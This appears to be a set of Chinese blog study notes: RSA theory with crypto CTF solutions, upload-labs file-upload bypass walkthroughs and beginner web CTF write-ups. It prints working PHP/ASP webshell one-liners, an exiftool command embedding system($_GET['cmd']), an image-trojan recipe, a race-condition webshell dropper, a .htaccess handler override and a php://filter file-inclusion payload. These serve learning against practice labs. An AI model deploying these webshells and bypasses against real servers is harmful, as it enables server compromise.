随意选择两个大的质数p和q，p不等于q，计算N = pq.2. 根据欧拉函数，求得r=φ(N)=φ(p)φ(q)=(p-1)(q-1)。3. 选择一个小于r的整数e,是e与r互质。并求得e关于r的模反元素，命名为d。(求d令ed≡1(mod r))。(模反元素存在，当且仅当e与r互质）4. 将p和q的记录销毁。 其中(N，e)是公钥，(N，d)是私钥。 例子： A随机选两个不相等的质数61和53，并计算两数的积N=61*53=3233，N的长度就是密钥长度。3233的二进制是110010100001，一共12位，所以这个密钥就是12位。实际应用中，RSA密钥一般是1024位，总要的场合是2048位。 计算N的欧拉函数。 φ(N)=(p-1)(q-1)=60*52=3120. A 在1到3120上随机选择了一个随机数e=17。 计算e对φ(N)的模反元素d，ed ≡ 1 (mod φ(N))等价于ed-1=kφ(N)。找到模反元素d，实质上就是对这个二元一次方程求解：17x+3120y=1。用扩展欧几里得算法求解。可以算出一组解(x,y)=(2753,-15)，即d=2753。 其中N=3233,e=17,d=2753。所以公钥就是(N,e)=(3233,17)，私钥(N,d)=(3233,2753)。实际应用中公钥和私钥都是采用ASN.1格式表达的。 2、可靠性密钥生成步骤，一共出现六个数字：p、q、N、φ(N)、e、d一旦d泄露，就等于私钥泄露。ed ≡ 1(mod φ(N))。只有知道e和φ(N)，才能算出dφ(N)=(p-1)(q-1)。只有知道p和q,才能算出φ(N）N=pq,只有将n分解才能算出p和q 只有将n质因数分解，才能算出d。也就意味着私钥破译。但大整数的质因数分解是非常困难的。 3、加密和解密加密加密要用到公钥(N,e)。假设B要向A发送加密信息m，B就要用A的公钥(N,e)对m进行加密。但m必须是整数(字符串可以取ascii值或unicode值)，且m必须小于n。加密就是计算下式的c。m^e ≡ c (mod n) 假设m=65,A的公钥(3233,17),所以等式如下：65^17≡2790（mod 3233） 所以c等于2790，B就把2790发给A。 解密A收到B发来的c(也就是2790)后，就用自己的私钥(3233,2753)进行解密。c^d ≡ m (mod n) 也就是c的d次方除以n的余数就是m。2790^2753 ≡ 65 (mod 3233)因此得到原文65。 证明证明为什么用私钥就能解密。就是要证明这个式子：c^d ≡ m (mod n) 因为加密规则是：ｍ^e ≡ c (mod n) 于是，c可以写成：c = m^e - kn 将c代入要我们要证明的那个解密规则：(m^e - kn)^d ≡ m (mod n) 等同于求证：m^ed ≡ m (mod n)因为:ed ≡ 1 (mod φ(n))所以:ed = hφ(n)+1将ed代入:m^(hφ(n)+1) ≡ m (mod n) 接下来，分成两种情况证明上面这个式子。 当m与n互质 根据欧拉定理，此时m^φ(n) ≡ 1 (mod n)得到:(m^φ(n))^h × m ≡ m (mod n)由此原始得到证明。 当m与n不是互质时 此时，由于n等于质数p和q的乘积，所以m必然等于kp或kq。以 m = kp为例，考虑到这时k与q必然互质，则根据欧拉定理，下面的式子成立：(kp)^q-1 ≡ 1 (mod q)进一步得到：[(kp)^(q-1)]^(h(p-1))× kp ≡ kp (mod q)即：(kp)^ed ≡ kp (mod q)改写成：(kp)^ed = tq + kp上式t必然能被p整除，即t=t&apos;p(kp)^ed = t&apos;pq + kp因为m=kp,n=pq,所以：m^ed ≡ m (mod n) 证明完毕。 参考博客：RSA算法原理(一)RSA算法原理(二) 五、RSA实战Crypto1：easy_RSA题目提示是RSA，下载题目查看由题目可知，只要计算出私钥d即可φ(N)=φ(p)φ(q)=(p-1)(q-1)ed ≡ 1 (mod φ(N))所以ed=φ(N)+1，即17d=(p-1)(q-1)+1=473398607160*4511490+1先计算欧拉函数φ(N)再加1然后除以17即是私钥d，也即是flag内容，加上flag{}提交 百度发现一个脚本，不过要安装gmpy2库#!/usr/bin/env python3# -*- coding:utf-8 -*-import gmpy2p = 473398607161q = 4511491e = 17s = (p-1)*(q-1)d = gmpy2.invert(e,s)print('flag is :',d) Crypto2：Normal_RSA下载题目，得到flag.enc和pubkey.pem。根据题目提示肯定是需要用到工具。RSA工具及使用这道题目主要需要用到RSAtools和OpenSSL1、用OpenSSL得到N命令：openssl rsa -pubin -text -modulus -in public.pem N=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DDModulus 是N的值，Exponent是e的值。16进制转10进制2、分解N的值，得到p、q在线大数分解即p=275127860351348928173285174381581152299、q=319576316814478949870590164193048041239 3、用RSAtools生成私钥文件private.pem命令：python rsatool.py -o private.pem -e 65537 -p 275127860351348928173285174381581152299 -q 319576316814478949870590164193048041239 4、用生成的private.pem和OpenSSL对flag.enc文件进行解密命令：openssl rsautl -decrypt -in flag.enc -inkey private.pem 得到flag 感悟学习了RSA加密算法之后，对RSA加密解密有了认识。同时为了能顺利使用rsatool，特意又搭了Kali虚拟机。果然Kali真的是强大的一批。小白进阶ing","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.gitee.io/blog/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.gitee.io/blog/tags/CTF/"},{"name":"Crypto","slug":"Crypto","permalink":"https://qwzf.gitee.io/blog/tags/Crypto/"},{"name":"RSA","slug":"RSA","permalink":"https://qwzf.gitee.io/blog/tags/RSA/"}],"author":"qwzf"},{"title":"文件上传漏洞 学习笔记(二)","slug":"文件上传漏洞 学习笔记(二)","date":"2019-08-03T02:22:22.464Z","updated":"2019-10-18T17:03:44.742Z","comments":true,"path":"2019/08/03/文件上传漏洞 学习笔记(二)/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/08/03/文件上传漏洞 学习笔记(二)/","excerpt":"","text":"前言之前已经总结了一部分文件上传漏洞，现在继续总结剩余的另一部分。 正文漏洞环境依旧用的upload-labs。 四、白名单限制文件上传文件截断绕过%00截断类型：PHP %00截断原理：因为00代表结束符，所以会把00后面的所有字符删除条件：PHP版本小于5.3.4，PHP的magic_quotes_gpc为OFF状态常见的截断上传0x00，%00，/00 截断的核心在于chr(0)这个字符，这个函数表示返回以数值表达式值为编码的字符。char(0)表示的ascll字符是null，当程序输出包含chr(0)变量时，chr(0)后面的数据会被截断，后面的数据直接忽略，导致漏洞产生。 Pass-11查看源码$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; &#125;&#125; 是白名单判断，但$img_path直接拼接，所以可以利用%00截断绕过，上传webshell。因为我的ubantu虚拟机PHP版本大于5.3.4，所以直接在windows进行测试。因为之前没用过，所以先配置一下：1、Firefox+Burpsuite抓包配置2、设置PHP版本3、magic_quotes_gpc调为OFF：magic_quotes_gpc函数的关闭方法 配置结束，开始上传webshell.jpg，抓包，添加webshell.php%00Forward发包，上传成功测试连接，连接成功 Pass-12查看源码，还是白名单判断，还是利用00截断。但save_path是通过post传进来的，post不会像get对%00进行自动解码，所以需要在二进制中进行修改。空格的十六进制是20 ，将0x20 改成0x00 也就是00点击Go，上传成功测试连接，连接成功 五、内容限制文件上传Pass-13要求上传图片马，查看源码function getReailFileType($filename)&#123; $file = fopen($filename, \"rb\"); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(\"C2chars\", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode)&#123; case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown')&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125; 分析代码，通过读文件的前2个字节判断文件类型，因此直接上传图片马即可， 图片马制作方法方法一：copy normal.jpg /b + shell.php /a webshell.jpg这里，b代表二进制，a代表ascii编码方法二：exiftool -Comment=&#39;&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET[&#39;cmd&#39;]); ?&gt;&#39; 1.jpg 我采用方法一先制作个图片马webshell.jpg(为了方便以后关卡一般直尝试jpg图片马)上传webshell.jpg，不用抓包改包，上传成功测试连接，连接失败，发现文件名被替换。一般使用BurpSuite的Repeater进行发包上传，方便查看被修改后的文件名。这里我用的本地搭建的环境，直接查看就行了。重新输入图片马的文件名，测试连接，连接成功。表示该图片上传成功，但并不意味者可以进行利用利用的话，还需要结合文件包含漏洞。这个靶场环境自带了个文件包含文件内容如下： &lt;?php/*本页面存在文件包含漏洞，用于测试图片马是否能正常运行！*/header(\"Content-Type:text/html;charset=utf-8\");$file = $_GET['file'];if(isset($file))&#123; include $file;&#125;else&#123; show_source(__file__);&#125;?&gt; 在php中，使用include,require、include_once、require_once函数包含的文件，会被当做php代码执行。无论文件的名称是什么，只要文件内容符合PHP代码规范，都会被当作PHP代码执行。列出目录 Pass-14依旧是上传图片马，查看源码function isImage($filename)&#123; $types = '.jpeg|.png|.gif'; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125; 这里用的是getimagesize获取文件类型，还是直接可以利用图片马就可以绕过。还用Pass-13制作的那个图片马，上传成功，连接成功。利用的话，结合文件包含漏洞。 当然查看有关信息发现可以图片头绕过，具体操作如下：将PHP木马文件，改成*.php;.jpg抓包，给文件头部加上：GIF89a 图片头标识 Pass-15查看源码function isImage($filename)&#123; //需要开启php_exif模块 $image_type = exif_imagetype($filename); switch ($image_type) &#123; case IMAGETYPE_GIF: return \"gif\"; break; case IMAGETYPE_JPEG: return \"jpg\"; break; case IMAGETYPE_PNG: return \"png\"; break; default: return false; break; &#125;&#125; 利用php_exif模块判断文件类型，还是直接利用图片马就可以绕过。上传图片马，在windows上上传有问题。所以打开ubantu漏洞环境上传，上传成功查看文件名测试连接，连接成功。利用的话，结合文件包含漏洞。 Pass-16依旧是上传图片马，上传、查看文件名(正常情况下是用代理工具(如：BurpSuite)查看文件名)测试连接、连接成功。利用的话，结合文件包含漏洞。不过查看源码发现，综合判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染，绕过方法(不想尝试，这里借用大佬的一张图)： 六、竞争条件攻击竞争条件攻击存在的原因：一些网站上传逻辑是先允许上传任意文件，然后检查上传文件是否包含WebShell脚本，如果包含则删除该文件。文件上传成功后和删除文件之间存在短的时间差。攻击者可以利用这个时间差完成竞争条件的上传漏洞攻击。攻击过程：攻击者先上传一个webshell脚本shell.php，shell.php的内容是生成一个新的webshell脚本webshell.phpshell.php代码如下：&lt;?phpfputs(fopen('../webshell.php','w'),'&lt;?php @eval($_POST['a']);?&gt;');?&gt; shell.php上传成功后，客户端立即访问shell.php，则会在当前目录下自动生成webshell.php，这时攻击者就利用时间差完成webshell的上传。 Pass-17查看源码$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,\".\")+1); $upload_file = UPLOAD_PATH . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; unlink($upload_file); &#125; &#125;else&#123; $msg = '上传出错！'; &#125;&#125; 这里先将文件上传到服务器，然后通过rename修改名称，再通过unlink删除文件，因此可以通过条件竞争的方式在unlink之前，访问webshell。首先在burp中不断发送上传webshell的数据包，然后不断在浏览器中访问，发现通过竞争可以访问到。(不会不断发送上传webshell的数据包，没有复现成功)upload-labs17 Pass-18本关需要上传图片马，查看代码发现：对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功 依旧用webshell.jpg图片马测试，发送上传图片马的数据包 CVE-2015-2348 move_uploaded_file() 00截断Pass-19考察CVE-2015-2348 move_uploaded_file() 00截断，上传webshell，同时自定义保存名称，直接保存为php是不行的查看源码，发现move_uploaded_file()函数中的img_path是由post参数save_name控制的，因此可以在save_name利用00截断绕过。上传的文件名用0x00绕过。改成*.php【二进制00】.1.jpg，上传文件名改成要自己定义。也可以上传webshell.php/.绕过下面用的windows的漏洞环境。两个文件名中间留一个空格将0x20改为0x00Forword发包，上传成功。测试连接，连接成功 感悟好了，总结完毕，总算了解完文件上传漏洞的各种绕过姿势，收获很大。继续努力，小白进阶ing。","categories":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/categories/Web/"}],"tags":[{"name":"BUG","slug":"BUG","permalink":"https://qwzf.gitee.io/blog/tags/BUG/"},{"name":"文件上传漏洞","slug":"文件上传漏洞","permalink":"https://qwzf.gitee.io/blog/tags/文件上传漏洞/"}],"author":"qwzf"},{"title":"文件上传漏洞 学习笔记(一)","slug":"文件上传漏洞 学习笔记(一)","date":"2019-07-31T15:01:05.126Z","updated":"2019-08-02T09:47:28.800Z","comments":true,"path":"2019/07/31/文件上传漏洞 学习笔记(一)/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/07/31/文件上传漏洞 学习笔记(一)/","excerpt":"","text":"前言学习进行时，最近我学习了文件上传漏洞，感觉收获很大，所以总结一下。 为什么存在文件上传漏洞上传文件时，Web应用程序没有对上传文件的格式进行严格过滤 , 就容易造成可以上传任意文件的情况。还有一部分是攻击者通过 Web服务器的解析漏洞来突破Web应用程序的防护。 危害上传漏洞与SQL注入或 XSS相比 , 其风险更大 , 如果 Web应用程序存在上传漏洞，攻击者可以利用上传的恶意脚本文件控制整个网站，甚至控制服务器，这个恶意脚本文件，又被称为WebShell，也可以将WebShell脚本称为一种网页后门。WebShell具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。 文件上传漏洞环境upload-labs：https://github.com/c0ny1/upload-labs皮卡丘：https://github.com/zhuifengshaonianhanlu/pikachuDoraBox：https://github.com/gh0stkey/DoraBox 正文为了方便，我直接把漏洞环境部署到ubantu虚拟机了。 一、任意文件上传DoraBox漏洞环境没有进行任何过滤，可以上传任意文件所以直接上传webshell(当然webshell有asp、aspx、php类型。我使用的是php)asp&lt;%eval request(“xxx”)%&gt; aspx&lt;%@ Page Languag=”xxx”%&gt;&lt;%eval(Request.Item[“xxx”])%&gt; php&lt;?php @eval($_POST['a']) ?&gt; 使用菜刀或蚁剑连一下，我用的蚁剑可以查看服务器文件和目录了下面的绕过类型都是通过的upload-labs漏洞环境来实现 二、JS限制文件上传Pass-01直接上传webshell，发现上传失败，只能上传后缀为.jpg|.png|.gif的文件。查看源码function checkFile() &#123; var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") &#123; alert(\"请选择要上传的文件!\"); return false; &#125; //定义允许上传的文件类型 var allow_ext = \".jpg|.png|.gif\"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\".\")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + \"|\") == -1) &#123; var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; &#125;&#125; 在客户端使用JS对不合法图片进行检查。所以绕过客户端JS检测，上传webshell客户端JS检测JS检测绕过上传漏洞，如果上传后缀不被允许，则会弹窗告知。上传文件的数据包没有发到服务端，只在客户端使用JavaScript对数据包进行检测。绕过客户端JS检测的三种方法 使用浏览器插件。删除检测文件后缀的JS代码，然后上传webshell 首先把webshell的后缀改成允许上传的.jpg|.png|.gif，绕过JS检测。再抓包，把后缀名改成.php,即可上传webshell 在前端js判断函数中加上可以上传php文件 尝试第二种，先把webshell的后缀.php改为.jpg然后上传，抓包修改后缀为.phpForward发包，上传成功测试连接，连接成功注意：测试完后删除webshell.php，因为后边我使用的都是同一个webshell(不是同一个，就不用删除) 二、MIME限制文件上传Pass-02直接上传webshell，发现上传失败，文件类型不正确。查看源码$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'] if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '文件类型不正确，请重新上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; &#125;&#125; 在服务端对数据包的MIME进行检查。所以绕过文件类型，上传webshellMIMEMIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。绕过服务端对数据包的MIME进行检查在客户端上传文件，通过BurpSuite抓包。 上传php文件时，Content-Type的值是application/octet-stream； 上传jpg文件时，Content-Type的值是image/jpeg 如果服务器通过Content-Type的值判断文件类型，上传php文件(webshell)时，将Content-Type的值修改为image/jpeg，即可上传php文件(webshell)。 所以上传webshell.php，抓包修改Content-Type的值为image/jpegForward发包，上传成功测试连接，连接成功 三、黑名单限制文件上传Apache解析 有些Apache允许解析其他文件后缀。如在http.conf中，若配置有如下代码，则能解析php和phtml文件 AddType application/x-httpd-php .php .phtml Apache的解析顺序是从右到左开始解析文件后缀的，如果最右侧扩展名不可识别，就继续往左判断。直到遇到可以解析的文件后缀为止htaccesshtaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。绕过文件后缀的方法 上传一个后缀为phtml的webshell 上传文件名类似1.php.xxxx，因为后缀xxxx不可以解析，所以向左解析后缀.php 构造.htaccess，实现重写文件解析。 大小写绕过 双写绕过 在后缀名中加空绕过 在后缀名中加”.”绕过 等等 Pass-03(上传webshell.phtml绕过) 直接上传webshell，发现上传失败。查看源码 $is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 黑名单判断，不允许上传.asp|.aspx|.php|.jsp后缀文件。尝试第一种方法，上传webshell.phtml上传成功，测试连接，连接失败。。 参考大佬博客，发现没有配置添加如下代码：AddType application/x-httpd-php .php .phtml 配置方法参照：ubuntu下apache与php配置好了，我已经配置完毕，删除之前的文件，再上传一次。测试连接，连接失败。。emmmmm。。。。查看上传的文件发现文件名被替换了。所以连接时文件名换一下，连接成功 Pass-04(重写文件解析绕过)查看源码$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\"php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\"pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传!'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 黑名单判断，不允许上传后缀文件为 .php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf 这样Pass-03的方法就没办法使用了。所以尝试使用方法3，构造.htaccess，实现重写文件解析。同样这样的前提也是得在配置文件里面有这样的一句话AllowOverride AllLoadModule rewrite_module modules/mod_rewrite.so 因为我的配置文件没有，所以配置一下。参考博客：apache开启rewrite重写.htaccess攻击配置完毕。把SetHandler application/x-httpd-php 这句话写成.htaccess，然后上传个jpg，它就当php解析了。.htaccess文件内容为：&lt;FilesMatch \"webshell\"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 先上传.htaccess文件，然后上传webshell.jpg上传成功，测试连接，连接成功 Pass-05(大小写绕过)查看源码发现，与Pass-04相比，多了不允许上传后缀文件.htaccess，但是没有将后缀进行大小写统一，于是可以通过大小写绕过。上传webshell.phP，上传成功。测试连接，连接失败。查看文件，发现文件名被替换重新输入文件名，测试连接，连接成功 Pass-06(加空格绕过)查看源码发现还是黑名单，但是没有对后缀名进行去空处理，可在后缀名中加空绕过。上传webshell.php，抓包，加空格上传成功。查看上传的文件名测试连接，连接成功 Pass-07(加.绕过)还是黑名单，禁止上传所有可以解析的后缀。但是没有对后缀名进行去”.”处理，利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过。上传webshell.php，抓包，加.上传成功。测试连接，连接成功 Pass-08(加::$DATA绕过)还是黑名单，但是没有对后缀名进行去”::$DATA”处理，利用windows特性，可在后缀名中加” ::$DATA”绕过。上传webshell.php，抓包，加::$DATA上传成功。测试连接，连接失败。因为我用的ubantu，所以用Windows执行上述操作就ok了，就不叙述了。 Pass-09(点+空格+点绕过)查看源码$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 还是黑名单，但是第15行和之前不太一样，路径拼接的是处理后的文件名。str_replace先删除一个点，再删除一个空格。点+空格+点，经过处理后，文件名变成webshell.php.，即可绕过。上传成功。测试连接，连接成功 Pass-10(双写绕过)查看源码发现关键代码$file_name = trim($_FILES['upload_file']['name']);//定义name$file_name = str_ireplace($deny_ext,\"\", $file_name);//替换上面的php这些为空 将问题后缀名替换为空，于是可以利用双写绕过。上传webshell.php，抓包，双写上传成功。测试连接，连接成功好了，就先总结这么多，剩下的另一篇《文件上传漏洞 学习笔记(二)》进行总结。 感悟文件上传漏洞总结之后，对文件上传漏洞理解了很多，也收获了很多。继续努力学习。小白进阶ing","categories":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/categories/Web/"}],"tags":[{"name":"BUG","slug":"BUG","permalink":"https://qwzf.gitee.io/blog/tags/BUG/"},{"name":"文件上传漏洞","slug":"文件上传漏洞","permalink":"https://qwzf.gitee.io/blog/tags/文件上传漏洞/"}],"author":"qwzf"},{"title":"南邮-Web(一)","slug":"南邮-Web(一)","date":"2019-07-25T12:05:46.537Z","updated":"2019-08-25T11:47:10.635Z","comments":true,"path":"2019/07/25/南邮-Web(一)/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/07/25/南邮-Web(一)/","excerpt":"","text":"前言最近做了些南邮的Web题，虽然有些比较基础，但依旧可以学到一些Web知识。 正文Web1：签到题题比较基础，查看源码即可 Web2：md5 collision审计题目的代码可知： 字符串QNKCDZO进行md5，得到md5值0e830400451993494058024219903391并赋值给变量$md51。 GET请求获取提交a的值并赋值给变量$a，并对$a进行md5操作赋值给$md52。 若变量$a不为空，且不等于’QNKCDZO’，并$md51与$md52的值内容相等，则可以得到 flag。 由于$md51为0e830400451993494058024219903391，在==比较时，会被认为是0*10^830400451993494058024219903391，也就是0。 那满足条件的变量$a就是其md5值是0e开头的即可找一个md5加密后为0的值：s878926199a更多请点击-&gt;MD5加密后==’0’ 由于是GET请求获取变量$a，构造参数flag显现 Web3：签到2 很明显，口令有11位，输入框只能输10位，增大输入框长度即可。输入口令得到flag Web4：这题不是WEB看题目提示，可能此题不是Web题。。。点开题目地址分析发现就这张图片比较可疑，保存图片，看是不是图片隐写。先用WinHex打开果然这题不是WEB，是图片隐写 Web5：层层递进题目描述没有提示，点击题目地址没有有用信息，查看网页源码发现有个SO.html,输入到url地址栏，并查看源码发现有个S0.html，输入到url地址栏，并查看源码发现有个SO.htm，输入到url地址栏，并查看源码发现有个S0.htm，输入到url地址栏，并查看源码发现有个404.html，输入到url地址栏查看源码发现flag了，flag是nctf{this_is_a_fl4g}。果然是层层递进。。。。。 Web6：AAencode先百度AAencode： 什么是jjencode?将JS代码转换成只有符号的字符串什么是aaencode？将JS代码转换成常用的网络表情。 根据题目描述，这是一道颜文字js加密，但是密文不应该是这样。所以应该编码有问题。用火狐打开，单击查看–&gt;文字编码–&gt;unicode编码成功，然后进行颜文字解密。可以用火狐的控制台，也可以用谷歌的Console Web7：单身二十年打开题目，查看源码点击，发现并没有进入到search_key.php。应该是重定向了。所以抓包，发送到Repeater点击Go，发包，得到flag了 Web8：php decode审计php代码。发现eval函数1，先百度一下eval：eval() 函数用来执行一个字符串表达式，并返回表达式的值。eval()函数会执行括号里面的语句，这种代码在现实中一般是某个黑客上传的一句话马。但在这里eval里面肯定就是flag了，所以将eval改为echo输出eval里面的内容运行php代码，得到flag Web9：文件包含点击”click me? no”，发现存在文件包含 http://4.chinalover.sinaapp.com/web7/index.php?file=show.php 文件包含？！不会。。。了解一下吧！文件包含漏洞文件包含解释：LFI是能够打开并包含本地文件的漏洞 所以这道题是本地文件包含， 尝试使用伪协议读取php文件http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php 得到base64加密后的字符串Base64解密，看到原内容，得到flag。 